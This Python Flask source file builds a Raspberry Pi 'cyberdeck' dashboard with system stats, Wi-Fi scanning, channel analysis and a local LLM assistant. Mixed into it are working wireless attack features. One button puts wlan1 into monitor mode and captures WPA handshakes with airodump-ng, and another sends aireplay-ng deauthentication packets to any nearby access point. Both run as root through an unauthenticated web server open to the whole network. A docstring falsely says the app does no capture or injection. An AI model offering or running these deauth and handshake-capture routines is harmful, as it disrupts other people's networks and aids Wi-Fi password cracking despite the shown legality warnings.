from flask import Flask, jsonify, render_template_string, request, send_file
import psutil
import shutil
import subprocess
import threading
import time
import requests
import io
from vosk import Model, KaldiRecognizer
import wave
import json as pyjson
import os

app = Flask(__name__)

# Load Vosk model once at startup
VOSK_MODEL_PATH = "vosk-model-small-en-us-0.15"
vosk_model = Model(VOSK_MODEL_PATH)

# =========================
# UI (plain strings; no f-strings to avoid brace issues)
# =========================

BASE_CSS = """
:root { --pad: 14px; --r: 18px; --b: #ddd; }
* { box-sizing: border-box; }
body { font-family: system-ui, -apple-system, Segoe UI, Roboto, sans-serif; margin: 16px; }
h1 { margin: 0 0 10px 0; font-size: 34px; }
a { text-decoration: none; }
.muted { opacity: 0.7; }
.grid { display: grid; grid-template-columns: repeat(2, minmax(0, 1fr)); gap: 12px; }
.card { border: 1px solid var(--b); border-radius: var(--r); padding: var(--pad); }
.big { font-size: 30px; font-weight: 750; margin-top: 6px; }
.row { display:flex; gap: 10px; margin-top: 12px; flex-wrap: wrap; align-items: center; }
.btn {
  font-size: 18px; padding: 14px 16px; border-radius: 16px;
  border: 1px solid #ccc; background: #fff; min-width: 120px;
}
.btn:active { transform: scale(0.99); }
.nav { display:flex; gap: 10px; flex-wrap: wrap; margin: 6px 0 14px; }
.nav a { display:inline-block; }
.table { width: 100%; border-collapse: collapse; }
.table th, .table td { text-align: left; padding: 10px; border-bottom: 1px solid #eee; font-size: 16px; }
.pill { display:inline-block; padding: 4px 10px; border-radius: 999px; border: 1px solid #ccc; font-size: 14px; }
input, textarea {
  width: 100%; font-size: 18px; padding: 12px 14px; border-radius: 14px; border: 1px solid #ccc;
}
textarea { min-height: 120px; }
"""

NAV = """
<div class="nav">
  <a class="btn" href="/">Home</a>
  <a class="btn" href="/system">System</a>
  <a class="btn" href="/wifi">Wi-Fi</a>
  <a class="btn" href="/channels">Channels</a>
  <a class="btn" href="/assistant">Assistant</a>
</div>
"""

HOME_PAGE = """
<!doctype html>
<html>
<head>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>AI Cyberdeck</title>
  <style>{{ css }}</style>
</head>
<body>
  <h1>AI Cyberdeck</h1>
  <div class="muted" id="subtitle">Loading…</div>
  {{ nav|safe }}

  <div class="grid">
    <div class="card"><div class="muted">CPU</div><div class="big" id="cpu">—</div></div>
    <div class="card"><div class="muted">Temp</div><div class="big" id="temp">—</div></div>
    <div class="card"><div class="muted">RAM</div><div class="big" id="ram">—</div></div>
    <div class="card"><div class="muted">Disk</div><div class="big" id="disk">—</div></div>
  </div>

  <div class="row">
    <button class="btn" onclick="location.reload()">Refresh</button>
    <button class="btn" onclick="toggleFullscreen()">Fullscreen</button>
    <button class="btn" id="handshakeBtn" onclick="toggleHandshake()">Start Handshake Capture</button>
    <span id="handshakeStatus" class="muted"></span>
  </div>

  <div class="card" style="margin-top:16px;">
    <b>Captured Handshakes:</b>
    <ul id="handshakeFiles"><li>Loading…</li></ul>
  </div>

<script>
async function tick(){
  const r = await fetch('/api/status', {cache:'no-store'});
  const s = await r.json();
  document.getElementById('cpu').textContent = s.cpu + '%';
  document.getElementById('temp').textContent = (s.temp_c ?? '—') + '°C';
  document.getElementById('ram').textContent = s.ram_used_gb + ' / ' + s.ram_total_gb + ' GB';
  document.getElementById('disk').textContent = s.disk_used_gb + ' / ' + s.disk_total_gb + ' GB';
  document.getElementById('subtitle').textContent =
    'Uptime: ' + s.uptime + '  •  Host: ' + s.host + '  •  IP: ' + s.ip;
  updateHandshakeFiles();
}
function toggleFullscreen(){
  if (!document.fullscreenElement) document.documentElement.requestFullscreen();
  else document.exitFullscreen();
}

let handshakeRunning = false;
async function toggleHandshake() {
  const btn = document.getElementById('handshakeBtn');
  const status = document.getElementById('handshakeStatus');
  if (!handshakeRunning) {
    btn.disabled = true;
    status.textContent = 'Starting...';
    const r = await fetch('/api/handshake/start', {method:'POST'});
    const data = await r.json();
    if (r.ok) {
      handshakeRunning = true;
      btn.textContent = 'Stop Handshake Capture';
      status.textContent = 'Capturing: ' + data.file;
    } else {
      status.textContent = data.status || 'Error';
    }
    btn.disabled = false;
  } else {
    btn.disabled = true;
    status.textContent = 'Stopping...';
    const r = await fetch('/api/handshake/stop', {method:'POST'});
    const data = await r.json();
    handshakeRunning = false;
    btn.textContent = 'Start Handshake Capture';
    status.textContent = data.status || 'Stopped';
    btn.disabled = false;
  }
}
async function updateHandshakeFiles() {
  const ul = document.getElementById('handshakeFiles');
  const r = await fetch('/api/handshakes');
  const data = await r.json();
  ul.innerHTML = '';
  if (data.files.length === 0) {
    ul.innerHTML = '<li>No handshakes found.</li>';
  } else {
    for (const f of data.files) {
      const li = document.createElement('li');
      const a = document.createElement('a');
      a.href = '/api/handshakes/' + encodeURIComponent(f);
      a.textContent = f + ' (download)';
      li.appendChild(a);
      ul.appendChild(li);
    }
  }
}
tick();
setInterval(tick, 1500);
</script>
</body>
</html>
"""

SYSTEM_PAGE = """
<!doctype html>
<html>
<head>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>System</title>
  <style>{{ css }}</style>
</head>
<body>
  <h1>System</h1>
  <div class="muted" id="subtitle">Loading…</div>
  {{ nav|safe }}

  <div class="card">
    <table class="table" id="tbl">
      <tr><th>Item</th><th>Value</th></tr>
    </table>
  </div>

<script>
function row(k,v){
  const tr=document.createElement('tr');
  const td1=document.createElement('td'); td1.textContent=k;
  const td2=document.createElement('td'); td2.textContent=v;
  tr.appendChild(td1); tr.appendChild(td2);
  return tr;
}
async function tick(){
  const r = await fetch('/api/system', {cache:'no-store'});
  const s = await r.json();
  document.getElementById('subtitle').textContent = 'Host: ' + s.host + '  •  Uptime: ' + s.uptime;
  const tbl=document.getElementById('tbl');
  tbl.innerHTML = '<tr><th>Item</th><th>Value</th></tr>';
  tbl.appendChild(row('CPU', s.cpu + '%'));
  tbl.appendChild(row('Temp', (s.temp_c ?? '—') + '°C'));
  tbl.appendChild(row('Load avg', s.loadavg.join(', ')));
  tbl.appendChild(row('RAM', s.ram_used_gb + ' / ' + s.ram_total_gb + ' GB'));
  tbl.appendChild(row('Disk /', s.disk_used_gb + ' / ' + s.disk_total_gb + ' GB'));
  tbl.appendChild(row('IP', s.ip));
  tbl.appendChild(row('Kernel', s.kernel));
}
tick();
setInterval(tick, 2000);
</script>
</body>
</html>
"""

WIFI_PAGE = """
<!doctype html>
<html>
<head>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Wi-Fi</title>
  <style>{{ css }}</style>
</head>
<body>
  <h1>Wi-Fi</h1>
  <div class="muted">Safe scan: SSID / Signal / Channel / Security (using wlan1 if present)</div>
  <div class="muted" style="color:red;font-weight:bold;">WARNING: Deauth attacks are illegal on networks you do not own or have permission to test!</div>
  {{ nav|safe }}

  <div class="row">
    <button class="btn" onclick="scan()">Scan</button>
    <span class="pill" id="count">…</span>
  </div>

  <div class="card" style="margin-top:12px;">
    <table class="table" id="tbl">
      <tr><th>SSID</th><th>Signal</th><th>Ch</th><th>Security</th><th>BSSID</th><th>Deauth</th></tr>
    </table>
  </div>

<script>
function esc(s){
  return (s ?? '').toString().replaceAll('&','&amp;').replaceAll('<','&lt;').replaceAll('>','&gt;');
}
function barsFromSignalText(sigText){
  const n = parseInt((sigText ?? '').toString().replace('%',''));
  if (Number.isNaN(n)) return {bars:"░░░░░░░░░░", num:null};
  const filled = Math.max(0, Math.min(10, Math.floor(n/10)));
  return {bars: "█".repeat(filled) + "░".repeat(10-filled), num:n};
}
async function scan(){
  const tbl=document.getElementById('tbl');
  tbl.innerHTML = '<tr><th>SSID</th><th>Signal</th><th>Ch</th><th>Security</th><th>BSSID</th><th>Deauth</th></tr>';
  document.getElementById('count').textContent = 'Scanning…';
  const r = await fetch('/api/wifi/scan', {cache:'no-store'});
  const data = await r.json();
  document.getElementById('count').textContent = data.networks.length + ' networks';
  for (const n of data.networks){
    const tr=document.createElement('tr');
    const sig = barsFromSignalText(n.signal);
    tr.innerHTML = `
      <td>${esc(n.ssid)}</td>
      <td style="font-family:monospace">${esc(sig.bars)} ${sig.num ?? ''}${sig.num===null?'':'%'}</td>
      <td>${esc(n.chan)}</td>
      <td>${esc(n.security)}</td>
      <td>${esc(n.bssid)}</td>
      <td><button class="btn deauth-btn" data-bssid="${encodeURIComponent(n.bssid)}" data-chan="${encodeURIComponent(n.chan)}" data-ssid="${esc(n.ssid)}">Deauth</button></td>
    `;
    tbl.appendChild(tr);
  }
  // Attach event listeners after table is built
  document.querySelectorAll('.deauth-btn').forEach(btn => {
    btn.onclick = function() {
      const bssid = decodeURIComponent(this.getAttribute('data-bssid'));
      const chan = decodeURIComponent(this.getAttribute('data-chan'));
      const ssid = this.getAttribute('data-ssid');
      confirmDeauth(bssid, chan, ssid);
    };
  });
}
async function confirmDeauth(bssid, chan, ssid) {
  if (!confirm(`WARNING: Deauth attacks are illegal on networks you do not own or have permission to test!\n\nTarget: ${ssid}\nBSSID: ${bssid}\nChannel: ${chan}\n\nProceed?`)) return;
  const btns = document.querySelectorAll('button');
  btns.forEach(b=>b.disabled=true);
  try {
    const r = await fetch('/api/deauth', {
      method: 'POST',
      headers: {'Content-Type':'application/json'},
      body: JSON.stringify({bssid: bssid, channel: chan})
    });
    const data = await r.json();
    alert(data.status ? `Deauth sent!\n${data.status}` : `Error: ${data.error || 'Unknown error'}`);
  } catch (e) {
    alert('Error sending deauth: ' + e);
  }
  btns.forEach(b=>b.disabled=false);
}
scan();
</script>
</body>
</html>
"""

CHANNELS_PAGE = """
<!doctype html>
<html>
<head>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Channels</title>
  <style>{{ css }}</style>
</head>
<body>
  <h1>Channels</h1>
  <div class="muted">2.4GHz channel crowding (1–13) based on nearby SSIDs.</div>
  {{ nav|safe }}

  <div class="row">
    <button class="btn" onclick="refresh()">Refresh</button>
    <span class="pill" id="meta">…</span>
    <span class="pill" id="suggest">…</span>
  </div>

  <div class="card" style="margin-top:12px;">
    <table class="table" id="tbl">
      <tr><th>Ch</th><th>Usage</th><th>Count</th></tr>
    </table>
  </div>

<script>
function bar(count, max){
  const width = 20;
  const fill = max > 0 ? Math.round((count / max) * width) : 0;
  return "█".repeat(fill) + "░".repeat(width - fill);
}
async function refresh(){
  const r = await fetch('/api/channels', {cache:'no-store'});
  const data = await r.json();

  document.getElementById('meta').textContent =
    data.total_networks + ' nets • strongest ch: ' + (data.strongest_channel ?? '—');
  document.getElementById('suggest').textContent =
    'suggested: ch ' + (data.suggested ?? '—');

  const tbl = document.getElementById('tbl');
  tbl.innerHTML = '<tr><th>Ch</th><th>Usage</th><th>Count</th></tr>';

  const max = data.max_count || 0;
  for (const row of data.channels){
    const tr = document.createElement('tr');
    tr.innerHTML = `
      <td>${row.channel}</td>
      <td style="font-family:monospace">${bar(row.count, max)}</td>
      <td>${row.count}</td>
    `;
    tbl.appendChild(tr);
  }
}
refresh();
</script>
</body>
</html>
"""

ASSISTANT_PAGE = """
<!doctype html>
<html>
<head>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Assistant</title>
  <style>{{ css }}</style>
</head>
<body>
  <h1>Assistant</h1>
  <div class="muted">v1: safe local summarizer. Next: local LLM + voice.</div>
  {{ nav|safe }}

  <div class="card">
    <div class="muted">Ask</div>
    <input id="q" placeholder="Try: summarize status" />
    <div class="row">
      <button class="btn" onclick="ask()">Send</button>
      <button class="btn" onclick="document.getElementById('q').value='summarize status'">Example</button>
      <button class="btn" onclick="document.getElementById('q').value='channels summary'">Channels</button>
    </div>
    <div class="muted" style="margin-top:10px;">Reply</div>
    <textarea id="a" readonly></textarea>
  </div>

<script>
async function ask(){
  const q = document.getElementById('q').value || '';
  document.getElementById('a').value = 'Thinking…';
  const r = await fetch('/api/assistant', {
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body: JSON.stringify({q})
  });
  const data = await r.json();
  document.getElementById('a').value = data.reply;
}
</script>
</body>
</html>
"""

# =========================
# Helpers
# =========================

def sh(cmd: list[str]) -> str:
    return subprocess.check_output(cmd, text=True).strip()

def get_temp_c():
    try:
        out = sh(["vcgencmd", "measure_temp"])  # temp=48.2'C
        return round(float(out.split("=")[1].split("'")[0]), 1)
    except Exception:
        return None

def get_uptime() -> str:
    try:
        with open("/proc/uptime", "r") as f:
            seconds = int(float(f.read().split()[0]))
        m, _s = divmod(seconds, 60)
        h, m = divmod(m, 60)
        d, h = divmod(h, 24)
        return f"{d}d {h}h {m}m"
    except Exception:
        return "?"

def get_ip() -> str:
    try:
        out = sh(["hostname", "-I"])
        return out.split()[0] if out else "?"
    except Exception:
        return "?"

def parse_nmcli_wifi() -> list[dict]:
    """
    Safe scan using NetworkManager. Prefers Alfa adapter on wlan1.
    Returns SSID, SIGNAL, SECURITY, CHAN. No capture/injection.
    """
    # Use wlan1 if it exists; otherwise fall back to whatever NM chooses.
    # We'll try wlan1 first, then fallback.
    cmd_wlan1 = [
      "nmcli", "-t",
      "-f", "SSID,BSSID,SIGNAL,SECURITY,CHAN",
      "dev", "wifi", "list",
      "ifname", "wlan1"
    ]
    cmd_any = [
      "nmcli", "-t",
      "-f", "SSID,BSSID,SIGNAL,SECURITY,CHAN",
      "dev", "wifi", "list"
    ]

    try:
        raw = sh(cmd_wlan1)
    except Exception:
        try:
            raw = sh(cmd_any)
        except Exception as e:
            return [{"ssid": "nmcli scan failed", "signal": "", "security": str(e), "chan": ""}]

    networks: list[dict] = []

    for line in raw.splitlines():
      parts = line.split(":")
      if len(parts) < 5:
        continue

      ssid = parts[0].strip() or "<hidden>"
      bssid = parts[1].strip()
      signal = parts[2].strip()
      security = parts[3].strip() or "—"
      chan = parts[4].strip()

      networks.append({
        "ssid": ssid,
        "signal": (signal + "%") if signal else "",
        "security": security,
        "chan": chan,
        "bssid": bssid,
      })

    def sig_num(n):
        try:
            return int(n["signal"].replace("%", ""))
        except Exception:
            return -1

    networks.sort(key=sig_num, reverse=True)
    return networks[:60]


# =========================
# Routes (pages)
# =========================

@app.get("/")
def home():
    return render_template_string(HOME_PAGE, css=BASE_CSS, nav=NAV)

@app.get("/system")
def system_page():
    return render_template_string(SYSTEM_PAGE, css=BASE_CSS, nav=NAV)

@app.get("/wifi")
def wifi_page():
    return render_template_string(WIFI_PAGE, css=BASE_CSS, nav=NAV)

@app.get("/channels")
def channels_page():
    return render_template_string(CHANNELS_PAGE, css=BASE_CSS, nav=NAV)

@app.get("/assistant")
def assistant_page():
    return render_template_string(ASSISTANT_PAGE, css=BASE_CSS, nav=NAV)


# =========================
# Routes (APIs)
# =========================

@app.get("/api/status")
def api_status():
    cpu = int(psutil.cpu_percent(interval=0.1))
    vm = psutil.virtual_memory()
    du = shutil.disk_usage("/")
    return jsonify({
        "cpu": cpu,
        "temp_c": get_temp_c(),
        "ram_used_gb": round((vm.total - vm.available) / (1024**3), 1),
        "ram_total_gb": round(vm.total / (1024**3), 1),
        "disk_used_gb": round((du.total - du.free) / (1024**3), 1),
        "disk_total_gb": round(du.total / (1024**3), 1),
        "uptime": get_uptime(),
        "host": sh(["hostname"]),
        "ip": get_ip(),
        "ts": int(time.time()),
    })

@app.get("/api/system")
def api_system():
    try:
        loadavg = [round(x, 2) for x in psutil.getloadavg()]
    except Exception:
        loadavg = ["?", "?", "?"]
    base = api_status().json
    base.update({
        "loadavg": loadavg,
        "kernel": sh(["uname", "-r"]),
    })
    return jsonify(base)

@app.get("/api/wifi/scan")
def api_wifi_scan():
    return jsonify({"networks": parse_nmcli_wifi(), "ts": int(time.time())})

@app.get("/api/channels")
def api_channels():
    nets = parse_nmcli_wifi()

    # Count 2.4GHz channels 1–13
    counts = {str(ch): 0 for ch in range(1, 14)}
    total = 0
    strongest = None  # (signal_int, channel_str)

    for n in nets:
        ch = (n.get("chan") or "").strip()
        if ch in counts:
            counts[ch] += 1
            total += 1

            try:
                sig = int((n.get("signal") or "0").replace("%", ""))
                if strongest is None or sig > strongest[0]:
                    strongest = (sig, ch)
            except Exception:
                pass

    rows = [{"channel": int(k), "count": v} for k, v in counts.items()]
    rows.sort(key=lambda r: r["channel"])
    max_count = max(counts.values()) if counts else 0

    # Suggest the least-crowded among 1/6/11 (classic 2.4 choices)
    candidates = ["1", "6", "11"]
    best = min(candidates, key=lambda c: counts.get(c, 999))

    return jsonify({
        "channels": rows,
        "max_count": max_count,
        "total_networks": total,
        "strongest_channel": (strongest[1] if strongest else None),
        "suggested": best,
        "ts": int(time.time()),
    })

@app.post("/api/assistant")
def api_assistant():
    payload = request.get_json(force=True, silent=True) or {}
    q = (payload.get("q") or "").strip()

    status = api_status().json

    if q.strip() == "" or "summarize" in q.lower() or "status" in q.lower():
        reply = (
            f"CPU {status['cpu']}%, temp {status['temp_c']}°C, "
            f"RAM {status['ram_used_gb']}/{status['ram_total_gb']} GB, "
            f"disk {status['disk_used_gb']}/{status['disk_total_gb']} GB. "
            f"Uptime {status['uptime']}. IP {status['ip']}."
        )
    elif "channels" in q.lower():
        ch = api_channels().json
        reply = (
            f"2.4GHz channel crowding: suggested channel {ch['suggested']}. "
            f"Strongest network is on channel {ch['strongest_channel'] or '—'}. "
            f"Total counted on channels 1–13: {ch['total_networks']}."
        )
    elif "wifi" in q.lower():
        nets = parse_nmcli_wifi()
        top = nets[0] if nets else None
        reply = "Open the Wi-Fi page to scan nearby networks. "
        if top:
            reply += f"Strongest right now: {top['ssid']} ({top['signal']}, ch {top.get('chan','?')}, {top['security']})."
    else:
        # Forward to local Ollama LLM
        try:
            ollama_url = "http://127.0.0.1:11434/api/generate"
            ollama_payload = {
                "model": "phi",
                "prompt": q,
                "stream": False
            }
            ollama_response = requests.post(ollama_url, json=ollama_payload, timeout=30)
            if ollama_response.ok:
                data = ollama_response.json()
                reply = data.get("response", "(No response from LLM)")
            else:
                reply = f"LLM error: {ollama_response.status_code}"
        except Exception as e:
            reply = f"LLM error: {e}"

    return jsonify({"reply": reply})


@app.post("/api/speech-to-text")
def api_speech_to_text():
    if 'audio' not in request.files:
        return jsonify({"error": "No audio file uploaded."}), 400
    audio_file = request.files['audio']
    with wave.open(audio_file, 'rb') as wf:
        if wf.getnchannels() != 1 or wf.getsampwidth() != 2 or wf.getframerate() != 16000:
            return jsonify({"error": "Audio must be mono, 16-bit, 16kHz WAV."}), 400
        rec = KaldiRecognizer(vosk_model, 16000)
        while True:
            data = wf.readframes(4000)
            if len(data) == 0:
                break
            rec.AcceptWaveform(data)
        result = rec.FinalResult()
        text = pyjson.loads(result).get('text', '')
    return jsonify({"text": text})


@app.post("/api/handshake/start")
def api_handshake_start():
    global handshake_capture_process, handshake_capture_file
    if handshake_capture_process and handshake_capture_process.poll() is None:
        return jsonify({"status": "already running", "file": handshake_capture_file}), 409
    # Put wlan1 into monitor mode
    try:
        subprocess.run(["sudo", "ip", "link", "set", "wlan1", "down"], check=True)
        subprocess.run(["sudo", "iw", "wlan1", "set", "monitor", "none"], check=True)
        subprocess.run(["sudo", "ip", "link", "set", "wlan1", "up"], check=True)
    except Exception as e:
        return jsonify({"status": "error", "error": str(e)}), 500
    # Start airodump-ng
    timestamp = int(time.time())
    capture_file = f"handshake_{timestamp}"
    handshake_capture_file = capture_file
    def run_airodump():
        global handshake_capture_process
        handshake_capture_process = subprocess.Popen([
            "sudo", "airodump-ng", "wlan1", "-w", capture_file, "--output-format", "pcap"
        ])
    t = threading.Thread(target=run_airodump, daemon=True)
    t.start()
    return jsonify({"status": "started", "file": capture_file + ".pcap"})

@app.post("/api/handshake/stop")
def api_handshake_stop():
    global handshake_capture_process
    if handshake_capture_process and handshake_capture_process.poll() is None:
        handshake_capture_process.terminate()
        handshake_capture_process = None
        return jsonify({"status": "stopped"})
    return jsonify({"status": "not running"}), 404


@app.get("/api/handshakes")
def api_list_handshakes():
    files = [f for f in os.listdir('.') if f.startswith('handshake_') and f.endswith('.pcap')]
    files.sort(reverse=True)
    return jsonify({"files": files})

@app.get("/api/handshakes/<fname>")
def api_download_handshake(fname):
    if not (fname.startswith('handshake_') and fname.endswith('.pcap')):
        return "Invalid file", 400
    if not os.path.exists(fname):
        return "Not found", 404
    return send_file(fname, as_attachment=True)


@app.post("/api/deauth")
def api_deauth():
    data = request.get_json(force=True, silent=True) or {}
    bssid = data.get("bssid")
    channel = data.get("channel")
    if not bssid or not channel:
        return jsonify({"error": "Missing BSSID or channel"}), 400
    # WARNING: Deauth attacks are illegal on networks you do not own or have permission to test!
    # Set wlan1 to the correct channel
    try:
        subprocess.run(["sudo", "iwconfig", "wlan1", "channel", str(channel)], check=True)
    except Exception as e:
        return jsonify({"error": f"Failed to set channel: {e}"}), 500
    # Run aireplay-ng deauth attack (10 packets as a demo, can be increased)
    try:
        result = subprocess.run([
            "sudo", "aireplay-ng", "--deauth", "10", "-a", bssid, "wlan1"
        ], capture_output=True, text=True, timeout=10)
        return jsonify({"status": "sent", "stdout": result.stdout, "stderr": result.stderr})
    except Exception as e:
        return jsonify({"error": f"Failed to run aireplay-ng: {e}"}), 500


if __name__ == "__main__":
    # Listen on all interfaces so you can view from other devices too.
    app.run(host="0.0.0.0", port=8080, debug=False)
